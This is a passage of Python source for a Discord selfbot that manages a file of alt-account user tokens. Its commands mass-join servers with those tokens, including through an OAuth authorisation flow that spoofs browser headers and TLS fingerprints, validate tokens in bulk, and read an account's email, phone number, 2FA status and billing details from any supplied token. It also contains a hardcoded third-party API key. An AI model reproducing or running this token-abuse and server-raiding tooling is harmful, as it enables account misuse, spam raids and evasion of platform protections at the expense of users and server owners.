            r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
            return r.json() if r.ok else False
        except Exception as e:
            print(f"[exchange_code] Error: {e}")
            return False

    def get_user(self, access: str):
        try:
            r = requests.get("https://canary.discord.com/api/v9/users/@me", headers={"Authorization": f"Bearer {access}"})
            data = r.json()
            if isinstance(data, dict) and 'id' in data:
                return data['id']
        except Exception as e:
            print(f"[get_user] Error: {e}")
        return None

    def get_headers(self, token):
        return {
            "Authorization": token,
            "Origin": "https://canary.discord.com",
            "Accept": "*/*",
            "X-Discord-Locale": "en-GB",
            "X-Super-Properties": SUPER_PROPERTIES,
            "User-Agent": USER_AGENT,
            "Referer": "https://canary.discord.com/channels/@me",
            "X-Debug-Options": "bugReporterEnabled",
            "Content-Type": "application/json"
        }


    def authorizer(self, token, guild, nickname):
        try:
            headers = self.get_headers(token)
            r = requests.post(AUTH_URL, headers=headers, json={"authorize": "true"})
            if not r.ok:
                return "fail"

            location = r.json().get("location") or ""
            if not location:
                return "fail"
            code = location.replace(f"{REDIRECT_URI}?code=", "")
            exchange = self.exchange_code(code)
            if not exchange:
                return "fail"

            access_token = exchange.get("access_token")
            userid = self.get_user(access_token)
            if not userid:
                return "fail"

            self.add_to_guild(access_token, userid, guild)
            if nickname:
                threading.Thread(target=self.rename, args=(token, guild, nickname)).start()

            return "ok"
        except Exception as e:
            print(f"[authorizer] Error: {e}")
            return "fail"

    def rename(self, token, guild, nickname):
        try:
            client = tls_client.Session(client_identifier="firefox_102")
            client.headers.update(self.get_headers(token))
            r = client.patch(
                f"https://canary.discord.com/api/v9/guilds/{guild}/members/@me",
                json={"nick": nickname})
            if r.status_code in (200, 201, 204):    
                return "ok" 
        except Exception as e:
            print(f"[rename] Error: {e}")
            return "error"

    def add_to_guild(self, access_token, userID, guild):
        try:
            url = f"{API_ENDPOINT}/guilds/{guild}/members/{userID}"
            headers = {
                "Authorization": f"Bot {BOT_TOKEN}",
                "Content-Type": "application/json"
            }
            r = requests.put(url=url, headers=headers, json={"access_token": access_token})
            return r.status_code
        except Exception as e:
            return 0

    def main(self, token, guild, nickname=None):
        try:
            joined = 0

            result = self.authorizer(token, guild, nickname)
            if result == "ok":
                joined = 1

            return joined
        except Exception as e:
            return 0

    @commands.command()
    async def ajoin(self,ctx,guild_id:int,num_tokens:int,nickname = None):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "r") as file:
            tokens = file.read().splitlines()
        if not tokens:
            await send(ctx, "Oauth Joiner", "No tokens found in `alt_tokens.txt`.")
            return
        if num_tokens > len(tokens):
            await send(ctx, "Oauth Joiner", f"Only `{len(tokens)}` tokens available. Adjusting count to `{len(tokens)}`.")
            num_tokens = len(tokens)
        processing_msg = await send(ctx,"Oauth Joiner",f"**Guild ID:** **`{guild_id}`**\n**Count:** **`{num_tokens}`**\n**Status:** **`Joining...`**")
        selected_tokens = tokens[:num_tokens]
        success_count = 0
        failure_count = 0
        for token in selected_tokens:
            token = token.split(":")[2] if "@" in token else token 
            result = await ctx.bot.loop.run_in_executor(executor, self.main, token, guild_id, nickname)
            if result == 1:
                success_count += 1
            else:
                failure_count += 1
        final_msg = f"> **Guild ID:** `{guild_id}`\n" \
                    f"> **Successful Joins:** `{success_count}`\n" \
                    f"> **Failed Joins:** `{failure_count}`\n" \
                    f"> **Status:** `Join completed.`\n"
        await processing_msg.delete()
        await send(ctx,"Oauth Joiner Results",final_msg)
    @commands.command()
    async def join(self, ctx, invite: str, count: int):
        await ctx.message.delete()
        if "discord.gg" in invite:
            invite = invite.strip().split('/')[-1]
        else:
            invite = invite.strip()
        success_count = 0
        failure_count = 0
        captcha_count = 0
        page_count = 1
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as file:
                tokens = file.read().splitlines()
            if not tokens:
                await send(ctx, "Joiner", "No tokens found in `alt_tokens.txt`.")
                return
            if count > len(tokens):
                await send(ctx, "Joiner", f"Only `{len(tokens)}` tokens available. Adjusting count to `{len(tokens)}`.")
                count = len(tokens)
            processing_msg = await send(ctx,"Joiner",f"**Invite:** **`{invite}`**\n**Count:** **`{count}`**\n**Status:** **`Joining...`**")
            selected_tokens = tokens[:count]

            for token in selected_tokens:
                token = token.split(":")[2] if "@" in token else token
                result = await self.join_with_token(token, invite, ctx)
                if result is True:
                    success_count += 1
                elif result == "captcha":
                    captcha_count += 1
                    failure_count += 1
                else:
                    failure_count += 1

            final_msg = f"> **Invite:** `{invite}`\n" \
                        f"> **Successful Joins:** `{success_count}`\n" \
                        f"> **Failed Joins:** `{failure_count}`\n" \
                        f"> **Status:** `Join completed.`\n"
            if captcha_count > 0:
                if success_count == 0:
                    final_msg += f"\n❌ **Joining failed due to captcha in tokens! Please use captcha-free (no cap) tokens or use OAuth joining (`.ajoin`).**"
                else:
                    final_msg += f"\n⚠️ **Some tokens failed to join due to captcha! Please use captcha-free (no cap) tokens or use OAuth joining (`.ajoin`).**"
            await processing_msg.delete()
            await send(ctx,"Joiner Results",final_msg)

        except FileNotFoundError:
            await send(ctx, "Joiner", "<:Warn:1475039889178230887> `alt_tokens.txt` file not found.")

    @commands.command()
    async def checkalts(self, ctx):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "r") as file:
            tokens = file.read().splitlines()
        if not tokens:
            await send(ctx, "ALT Token Checker", "No tokens found in `alt_tokens.txt`.")
            return
        processing_msg = await send(ctx,"ALT Token Checker",f"**Count:** **`{len(tokens)}`**\n**Status:** **`Checking...`**")
        valid_tokens = []
        invalid_tokens = []
        for token in tokens:
            result = await self.check_token(token) 
            if result:
                valid_tokens.append(token)
            else:
                invalid_tokens.append(token)          
        with open("alt_tokens_data/alt_tokens.txt", "w") as file:
            for line in valid_tokens:
                file.write(f"{line}\n")
        with open("alt_tokens_data/invalid_tokens.txt", "w") as file:
            for line in invalid_tokens:
                file.write(f"{line}\n")
        await processing_msg.delete()
        await send(ctx,"ALT Token Checker",f"**Valid Tokens:** **`{len(valid_tokens)}`**\n**Invalid Tokens:** **`{len(invalid_tokens)}`**\n**Status:** **`Check completed.`**")

    @commands.command(aliases=['addalt'])
    async def addalts(self, ctx, *, token: str):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "a") as file:
            file.write(f"{token}\n")
        await send(ctx, "Alts Manager", "<:emoji_1738342244745:1334928872269152259> **Token added successfully.**")

    @commands.command(aliases=['remalts','remalt'])
    async def removealt(self, ctx, *, token: str):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "r") as file:
            lines = file.readlines()
        with open("alt_tokens_data/alt_tokens.txt", "w") as file:
            for line in lines:
                if line.strip() != token:
                    file.write(line)
        await send(ctx, "Alts Manager", "<:emoji_1738342244745:1334928872269152259> **Token removed successfully.**")

    @commands.command()
    async def clearalts(self, ctx):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "w") as file:
            file.write("")
        await send(ctx, "Alts Manager", "<:emoji_1738342244745:1334928872269152259> **ALT tokens cleared successfully.**") 


    
class check(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def checker(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"              
            f"<:BadgeDeveloper:1290693804013129768> **Check Token** **:** **`{prefix}checktoken [token]`**\n"
            f"<:BadgeDeveloper:1290693804013129768> **Check IP** **:** **`{prefix}checkip [IP]`**\n"
            f"<:BadgeDeveloper:1290693804013129768> **Check Promo** **:** **`{prefix}checkpromo [link]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Checker Commands__<:Titanz:1281243489635405827>", description)


    @commands.command(aliases=['checktoken','tokeninfo'])
    async def tokencheck(self, ctx, token):
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
        TIME_ZONE = config.get("time_zone")
        await ctx.message.delete()
        try:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            data = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

            if data.status_code == 200:
                j = data.json()
                name = f'{j["username"]}'
                userid = j['id']
                avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
                phone = j.get('phone', 'N/A')
                isverified = j['verified']
                email = j.get('email', 'N/A')
                twofa = j['mfa_enabled']
                flags = j['flags']
                utc_time = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000)
                local_tz = pytz.timezone(TIME_ZONE)
                creation_date = utc_time.astimezone(local_tz).strftime('%d-%m-%Y %H:%M:%S %Z')

                user_info = (
                    f" <:white_arrow:1290693789824061461> User: `{name}`\n"
                    f" <:white_arrow:1290693789824061461> User ID: `{userid}`\n"
                    f" <:white_arrow:1290693789824061461> Avatar URL: [`{name}'s Avatar`]({avatar})\n"
                    f" <:white_arrow:1290693789824061461> Phone: `{phone}`\n"
                    f" <:white_arrow:1290693789824061461> Verified: `{isverified}`\n"
                    f" <:white_arrow:1290693789824061461> Email: `{email}`\n"
                    f" <:white_arrow:1290693789824061461> 2FA Enabled: `{twofa}`\n"
                    f" <:white_arrow:1290693789824061461> Flags: `{flags}`\n"
                    f" <:white_arrow:1290693789824061461> Account Creation Date: `{creation_date}`"
                )
                await send(ctx, "Token Information", user_info)

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()
                if nitro_data:
                    end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    total_nitro = abs((start - end).days)

                    nitro_info = (
                        f" <:white_arrow:1290693789824061461> User: `{name}`\n"
                        f" <:white_arrow:1290693789824061461> Nitro Start Date: `{start}`\n"
                        f" <:white_arrow:1290693789824061461> Nitro End Date: `{end}`\n"
                        f" <:white_arrow:1290693789824061461> Total Nitro Days: `{total_nitro}`"
                    )
                    await send(ctx, "Nitro Data", nitro_info)
                else:
                    await send(ctx, "Nitro Data", "No Nitro subscription found for this token.")
            else:
                error_info = (
                    f" <:white_arrow:1290693789824061461> Invalid token:\n"
                    f" <:white_arrow:1290693789824061461> Status Code: `{data.status_code}`\n"
                    f" <:white_arrow:1290693789824061461> Response: `{data.text}`"
                )
                await senderror(ctx, "Error", error_info)
        except Exception as e:
            await senderror(ctx, "Unexpected Error", str(e))

    @commands.command(aliases=['checkip','iplookup','ipinfo'])
    async def ipcheck(self, ctx, ip):
        """Look up information about an IP address."""
        await ctx.message.delete()
        api_key = 'a91c8e0d5897462581c0c923ada079e5'
        api_url = f'https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}'

        response = requests.get(api_url)
        data = response.json()

        if 'country_name' in data:
            country = data['country_name']
            city = data['city']
            isp = data['isp']
            current_time_unix = data['time_zone']['current_time_unix']
            current_time_formatted = f"<t:{int(current_time_unix)}:f>"
            message = (
                f" <:white_arrow:1290693789824061461> **IP**: **{ip}**\n"
                f" <:white_arrow:1290693789824061461> **Country**: **{country}**\n"
                f" <:white_arrow:1290693789824061461> **City**: **{city}**\n"
                f" <:white_arrow:1290693789824061461> **ISP**: **{isp}**\n"
                f" <:white_arrow:1290693789824061461> **Current Time**: {current_time_formatted}"
            )

            await send(ctx, "IP Lookup", f"{message}")
        else:
            await senderror(ctx, "Error", "Invalid IP provided.")

    @commands.command(aliases=['promocheck','promoinfo'])
    async def checkpromo(self, ctx, *, promo_links: str):
        await ctx.message.delete()
        links = promo_links.split('\n')
        async with aiohttp.ClientSession() as session:
            for link in links:
                promo_code = self.extract_promo_code(link)
                if promo_code:
                    result = await self.check_promo(session, promo_code)
                    await send(ctx, "Promo Result", result, "10")
                else:
                    await ctx.send(f" <:white_arrow:1290693789824061461> **Invalid Link**: `{link}`", delete_after=30)

    def extract_promo_code(self, link):
        """Extract promo code from a given link."""
        try:
            return link.strip().split('/')[-1]
        except Exception:
            return None

    async def check_promo(self, session, promo_code):
        """Check the promo code status."""
        url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

        try:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()

                    if data.get("uses") == data.get("max_uses"):
                        return f" <:white_arrow:1290693789824061461> **Code**: {promo_code}\n**Status**: Already Claimed\n**Title**: `{data.get('promotion', {}).get('inbound_header_text', 'No Title')}`\n**Expiration**: `N/A`"

                    exp_at = data.get("expires_at", None)
                    if exp_at:
                        try:
                            exp_at = exp_at.split(".")[0]  # Remove fractional seconds
                            parsed = date_parser.parse(exp_at)
                            now = datetime.utcnow()
                            days_left = abs((now - parsed).days)
                            title = data.get("promotion", {}).get('inbound_header_text', 'No Title')
                            return f" <:white_arrow:1290693789824061461> **Code**: `{promo_code}`\n**Status**: `Valid`\n**Title**: `{title}`\n**Expires in**: `{days_left}` days"
                        except Exception as e:
                            return f" <:white_arrow:1290693789824061461> **Code**: `{promo_code}`\n**Status**: `Valid`, but failed to parse expiration date: {str(e)}"
                    else:
                        return f" <:white_arrow:1290693789824061461> **Code**: `{promo_code}`\n**Status**: `Valid`\n**Expiration**: No expiration date available"

                elif response.status == 429:
                    return f" <:white_arrow:1290693789824061461> **Code**: `{promo_code}`\n**Status**: `Rate Limited`\nToo many requests, try again later"
                else:
                    return f" <:white_arrow:1290693789824061461> **Code**: `{promo_code}`\n**Status**: `Invalid`\n**Error**: `{response.status}`"

        except Exception as e:
            return f" <:white_arrow:1290693789824061461> **Code**: `{promo_code}`\n**Status**: `Error`\n**Message**: `{str(e)}`"

class settings(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def load_config(self):  
        with open('config.json', 'r') as config_file:
            return json.load(config_file)

    @commands.command()
    async def config(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"                    
            f"<:Settings:1290692093001469994> | **no-prefix mode** **:** **`{prefix}noprefix [enable|disable]`**\n"
            f"<:Settings:1290692093001469994> | **Set prefix** **:** **`{prefix}setprefix [prefix]`**\n"
            f"<:Settings:1290692093001469994> | **ping scan** **:** **`{prefix}pingscan [enable|disable]`**\n"
            f"<:Settings:1290692093001469994> | **Configure Selfapp** **:** **`{prefix}bot [name|avatar] <name/avatar_url>`**\n"
            f"<:Settings:1290692093001469994> | **Set webhook** **:** **`{prefix}setwebhook [url]`**\n"
            f"<:Settings:1290692093001469994> | **Set Embed Colour** **:** **`{prefix}setcolour [hex_code]`**\n"            
            f"<:Settings:1290692093001469994> | **Change Msg type** **:** **`{prefix}selfmode [text|embed]`**\n"
            f"<:Settings:1290692093001469994> | **Add Alias in cmd** **:** **`{prefix}alias+ [cmd] [alias]`**\n"
            f"<:Settings:1290692093001469994> | **Remove Alias** **:** **`{prefix}alias- [alias]`**\n"
            f"<:Settings:1290692093001469994> | **Stop the bot** **:** **`{prefix}stop`**\n"
            f"<:Settings:1290692093001469994> | **Restart the bot** **:** **`{prefix}restart`**\n"
            f"<:Settings:1290692093001469994> | **Set timezone** **:** **`{prefix}settimezone [timezone]`**\n"
            f"<:Settings:1290692093001469994> | **Check cmd aliases** **:** **`{prefix}checkalias [command]`**\n"
            f"<:Settings:1290692093001469994> | **Check cmd usage** **:** **`{prefix}checkusage [command]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Config Commands__<:Titanz:1281243489635405827>", description)

    @commands.command()
    async def bot(self, ctx, option: str = None, *, value: str = None):
        await ctx.message.delete()
        if not option or not value:
            await send(ctx, "Helper Bot Settings", "Usage: `+bot name <new_name>` or `+bot avatar <image_url_or_path>`")
            return

        option = option.lower()
        if option not in ("name", "avatar"):
            await send(ctx, "Helper Bot Settings", "Invalid option. Choose either `name` or `avatar`.")
            return

        if not os.path.exists("config/bot_config.json"):
            await send(ctx, "Helper Bot Settings", "config/bot_config.json file does not exist!")
            return

        try:
            with open("config/bot_config.json", "r") as f:
                bot_config = json.load(f)
        except Exception as e:
            await send(ctx, "Helper Bot Settings", f"Failed to read config/bot_config.json: {e}")
            return

        bot_token = bot_config.get("BOT_TOKEN") or bot_config.get("bot_token")
        if not bot_token:
            await send(ctx, "Helper Bot Settings", "BOT_TOKEN is missing in config/bot_config.json!")
            return

        profile_url = "https://discord.com/api/v9/users/@me"
        profile_headers = {
            "Authorization": f"Bot {bot_token}",
            "Content-Type": "application/json"
        }
        profile_payload = {}

        if option == "name":
            # Update local config
            bot_config["BOT_NAME"] = value
            if "bot_name" in bot_config:
                bot_config["bot_name"] = value
            profile_payload["username"] = value
            success_msg = f"Helper bot name changed to **{value}**."

        elif option == "avatar":
            # Update local config
            bot_config["BOT_AVATAR"] = value
            if "bot_avatar" in bot_config:
                bot_config["bot_avatar"] = value
            
            # Fetch/encode avatar
            image_data = None
            if value.startswith("http://") or value.startswith("https://"):
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(value) as resp:
                            if resp.status == 200:
                                image_bytes = await resp.read()
                                import base64
                                content_type = resp.headers.get("Content-Type", "image/png")
                                b64 = base64.b64encode(image_bytes).decode("utf-8")
                                image_data = f"data:{content_type};base64,{b64}"
                except Exception as e:
                    await send(ctx, "Helper Bot Settings", f"Error downloading bot avatar: {e}")
                    return
            else:
                if os.path.exists(value):
                    try:
                        with open(value, "rb") as f:
                            image_bytes = f.read()
                        import base64
                        ext = value.split(".")[-1]
                        content_type = "image/jpeg" if ext in ("jpg", "jpeg") else "image/png"
                        if ext == "gif":
                            content_type = "image/gif"
                        b64 = base64.b64encode(image_bytes).decode("utf-8")
                        image_data = f"data:{content_type};base64,{b64}"
                    except Exception as e:
                        await send(ctx, "Helper Bot Settings", f"Error reading local bot avatar: {e}")
                        return
                else:
                    await send(ctx, "Helper Bot Settings", f"Avatar file path/URL does not exist: `{value}`")
                    return

            if image_data:
                profile_payload["avatar"] = image_data
            success_msg = "Helper bot avatar updated successfully."

        # Save config
        try:
            with open("config/bot_config.json", "w") as f:
                json.dump(bot_config, f, indent=4)
        except Exception as e:
            await send(ctx, "Helper Bot Settings", f"Failed to save config/bot_config.json: {e}")
            return

        # Make PATCH request instantly to Discord
        if profile_payload:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.patch(profile_url, headers=profile_headers, json=profile_payload) as resp:
                        if resp.status == 200:
                            await send(ctx, "Helper Bot Settings", success_msg)
                        else:
                            await send(ctx, "Helper Bot Settings", f"Failed to update profile on Discord: {resp.status} - {await resp.text()}")
            except Exception as e:
                await send(ctx, "Helper Bot Settings", f"Discord profile update request failed: {e}")

    @commands.command(name='noprefix', aliases=['np'])
    async def nonprefix(self,ctx, status: str):
        await ctx.message.delete()
        if status.lower() not in ['enable', 'disable']:
            await ctx.send("Usage: `nonprefix <enable|disable>`")
            return
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except FileNotFoundError:
            await ctx.send("Config.json file not found.","10")
            return
        if status.lower() == 'enable':
            if "prefix" in config:
                del config["prefix"]
            config["prefix"] = ""
            await send(ctx, "Non-prefix", "<:white_arrow:1290693789824061461> Non-prefix mode enabled.","10")
        elif status.lower() == 'disable':
            if "prefix" in config:
                del config["prefix"]
            config["prefix"] = ","
            await send(ctx, "Non-prefix", "<:white_arrow:1290693789824061461> Non-prefix mode disabled. Prefix is now set to `\",\"`.\nYou can change it using **`,setprefix <new_prefix` command**","10")
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)

    @commands.command(name='setprefix')
    async def setprefix(self, ctx, new_prefix: str):
        await ctx.message.delete()
        config = self.load_config()
        config['prefix'] = new_prefix
        with open("config.json", 'w') as config_file:
            json.dump(config, config_file, indent=4)
        await send(ctx,"Set prefix",f"<:white_arrow:1290693789824061461> Prefix has been updated to: `{new_prefix}`","30")

    @commands.command()   
    async def pingscan(self, ctx, option: str):
        await ctx.message.delete()
        if option.lower() not in ['enable', 'disable']:
            await ctx.send("Usage: `pingscan <enable|disable>`",delete_after=10)
            return
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except FileNotFoundError:
            return
        if option.lower() == 'enable':
            config['ping_scan'] = True
            await send(ctx, "Ping Scan", "<:white_arrow:1290693789824061461> Ping scan enabled.","10")
        elif option.lower() == 'disable':
            config['ping_scan'] = False
            await send(ctx, "Ping Scan", "<:white_arrow:1290693789824061461> Ping scan disabled.","10")
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)

    @commands.command()
    async def setwebhook(self, ctx,webhook_url):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        config['webhook_url'] = webhook_url
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)
        await ctx.send("<:white_arrow:1290693789824061461> Webhook URL has been updated.",delete_after = 30)

    @commands.command()
    async def stop(self, ctx):
        await ctx.message.delete()
        await ctx.send("<:white_arrow:1290693789824061461> Stopping the bot...")
        await self.bot.close()    

    @commands.command()
    async def setcolour(self, ctx, hex_code: str):
        await ctx.message.delete()
        if not re.fullmatch(r"#[0-9A-Fa-f]{6}", hex_code):
            return await ctx.send("Invalid hex color! Please provide a valid hex code (e.g., #FF5733).")
        with open("config.json", "r") as f:
            config = json.load(f)
        config["embed_colour"] = hex_code
        with open("config.json", "w") as f:
            json.dump(config, f, indent=4)
        await ctx.send(f"<:white_arrow:1290693789824061461> **Embed Colour for Embed mode updated to {hex_code}!**",delete_after=30)


    @commands.command()
    async def restart(self,ctx):
        await ctx.message.delete()
        await ctx.send("<:white_arrow:1290693789824061461> Restarting")
        os.execl(sys.executable, sys.executable, *sys.argv)

    @commands.command(aliases=['settz'])
    async def settimezone(self, ctx, time_zone: str):
        await ctx.message.delete()
        try:
            valid_time_zone = pytz.timezone(time_zone)
            formatted_time_zone = ' '.join(word.capitalize() for word in time_zone.split())
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
            config['time_zone'] = formatted_time_zone
            with open('config.json', 'w') as config_file:
                json.dump(config, config_file, indent=4)
            await send(ctx, "Time Zone", f"<:white_arrow:1290693789824061461> **Time zone has been updated to `{formatted_time_zone}`.**", "10")
        except pytz.UnknownTimeZoneError:
            await senderror(ctx, "Error", "Invalid time zone. Please provide a valid time zone.")

    @commands.command(aliases=['searchalias','alias','lookalias'])
    async def checkalias(self, ctx, command: str):
        await ctx.message.delete()
        command = self.bot.get_command(command)
        aliases = [command.name] + command.aliases
        alias_message = (
            f"<:white_arrow:1290693789824061461> **Command :** **`{command.name}`**\n"
            f"<:white_arrow:1290693789824061461> **Aliases :** {', '.join(f'**`{alias}`**' for alias in aliases)}"
        )
        await send(ctx,"Command Aliases",alias_message)

    @commands.command(aliases=['seeusage','usage','lookusage'])
    async def checkusage(self, ctx, command_name: str):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")          
        try:
            command = self.bot.get_command(command_name)        
            command_usage = command.usage or f"{prefix}{command.name} {command.signature}"  
            command_usage = command_usage.replace("<", "TEMP").replace("[", "<").replace("TEMP", "[").replace(">", "TEMP").replace("]", ">").replace("TEMP", "]")
            alias_message = (
                f"<:white_arrow:1290693789824061461> **Command :** **`{command.name}`**\n"
                f"<:white_arrow:1290693789824061461> **Usage :** **`{command_usage}`**"
            )
            await send(ctx,"Command Usage",alias_message,"[ REQUIRED ] | < OPTIONAL >")
        except:
            await ctx.send(f'**Command** **`{command_name}`** **not found**',delete_after=20)

    @commands.command()
    async def selfmode(self,ctx,option: int):
        await ctx.message.delete()
        if option not in [1,2,3,4]:
            await ctx.send("Usage: `selfmode <1|2|3|4>`",delete_after=10)
            return
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except FileNotFoundError:
            return
        if option == 1:
            config['mode'] = 1
            await send(ctx, "Selfmode", "<:white_arrow:1290693789824061461> Selfbot messages mode set to text mode (nitro needed).","10")
        elif option == 2:
            config['mode'] = 2
            await send(ctx, "Selfmode", "<:white_arrow:1290693789824061461> Selfbot messages mode set to embed mode.","10")
        elif option == 3:
            config['mode'] = 3        
            await send(ctx, "Selfmode", f"<:white_arrow:1290693789824061461> Selfbot messages mode set to OG VoltriX mode.","10")                   
        elif option == 4:
            config['mode'] = 4
            await send(ctx, "Selfmode", f"<:white_arrow:1290693789824061461> Selfbot messages mode set to Selfapp mode.","10")
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)

class crypto(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_usd_to_inr_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['INR']
            else:
                return 85  # Fallback to a static value
        except Exception as e:
            print(f"Error fetching INR exchange rate: {e}")
            return 85  # Fallback to a static value

    def get_usd_to_eur_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['EUR']
            else:
                return 0.85  # Fallback to a static value
        except Exception as e:
            print(f"Error fetching EUR exchange rate: {e}")
            return 0.85  # Fallback to a static value

    async def fetch_crypto_price(self, coin_id):
        async with aiohttp.ClientSession() as session:
            url = f'https://api.coingecko.com/api/v3/coins/{coin_id}'
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.json()
                return None

    async def get_crypto_price_embed(self, coin_name, coin_id, ctx):
        data = await self.fetch_crypto_price(coin_id)
        if data:
            price = data['market_data']['current_price']['usd']
            euro_price = price * self.get_usd_to_eur_rate()
            inr_price = price * self.get_usd_to_inr_rate()
            await send(ctx, f"{coin_name} Price", f"<:white_arrow:1290693789824061461> Current {coin_name} Price: `{price} $`, `{euro_price:.2f} €`, `{inr_price:.2f} ₹`", "30")
        else:
            await senderror(ctx, "Error", f"Failed to retrieve {coin_name} price")

    @commands.command(aliases=["ltctx", "ltc_tx", "txhistory"])
    async def txhistory(self, ctx, address: str):
        """Fetches the last 5 transactions of a given Litecoin address with proper details."""
        await ctx.message.delete()
        API_URL = f"https://api.blockchair.com/litecoin/dashboards/address/{address}?transaction_details=true"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL) as response:
                    if response.status != 200:
                        await send(ctx, "LTC TX History", "<:CROSS_TDG:1321149916201881683> **Invalid Litecoin address or no transaction history found!**")
                        return
                    data = await response.json()

            if "data" not in data or address not in data["data"]:
                await send(ctx, "LTC TX History", "<:CROSS_TDG:1321149916201881683> **Invalid Litecoin address or no transaction history found!**")
                return

            transactions = data["data"][address]["transactions"]

            if not transactions:
                message = (
                    f"**No transactions found for this address!** <a:check:1281246680724930683>\n\n"
                    f"**<:RS_LTC:1291423858183897120> Litecoin Address:**\n"
                    f"<:white_arrow:1290693789824061461>`{address}`"
                )
